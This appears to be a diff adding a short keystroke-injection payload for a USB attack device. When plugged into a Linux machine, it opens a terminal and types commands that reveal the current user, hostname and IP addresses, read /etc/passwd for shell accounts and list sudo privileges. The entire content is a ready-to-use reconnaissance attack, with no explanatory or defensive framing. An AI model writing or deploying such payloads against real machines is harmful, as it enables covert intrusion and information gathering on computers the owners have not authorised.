@@ -1,0 +1,5 @@
+DELAY 1000
+CTRL ALT t
+DELAY 1000
+STRING whoami && hostname && ip addr show | grep -E "inet " && cat /etc/passwd | grep -E "/bin/bash|/bin/sh" && sudo -l 2>/dev/null
+ENTER
